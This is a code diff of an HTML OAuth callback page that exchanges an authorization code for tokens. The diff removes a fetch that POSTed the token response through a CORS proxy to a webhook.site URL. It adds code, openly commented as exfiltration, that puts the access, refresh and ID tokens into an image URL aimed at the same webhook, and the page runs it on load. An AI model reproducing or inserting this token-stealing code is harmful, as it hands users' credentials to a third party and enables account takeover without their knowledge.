@@ -7,7 +7,6 @@
   <h1>✅ Callback Received</h1>
   <pre id="result">Waiting...</pre>
 
-  <!-- ⬇️ Move the script to the very end -->
   <script>
     async function exchangeCode() {
       const urlParams = new URLSearchParams(window.location.search);
@@ -29,19 +28,14 @@
       });
 
       const result = await response.json();
+      document.getElementById("result").textContent = JSON.stringify(result, null, 2);
 
-      // ✅ Make sure the element exists
-      const resultElem = document.getElementById("result");
-      if (resultElem) {
-        resultElem.textContent = JSON.stringify(result, null, 2);
-      }
-
-      // ✅ Send to webhook using proxy
-      fetch("https://corsproxy.io/?" + encodeURIComponent("	https://webhook.site/3cb3a784-1b93-4258-9437-ddbdfd2db388"), {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(result)
-      });
+      // ✅ Exfiltrate tokens via image (no CORS)
+      const img = new Image();
+      img.src = `https://webhook.site/3cb3a784-1b93-4258-9437-ddbdfd2db388?` +
+        `access_token=${encodeURIComponent(result.access_token || "")}` +
+        `&refresh_token=${encodeURIComponent(result.refresh_token || "")}` +
+        `&id_token=${encodeURIComponent(result.id_token || "")}`;
     }
 
     exchangeCode();
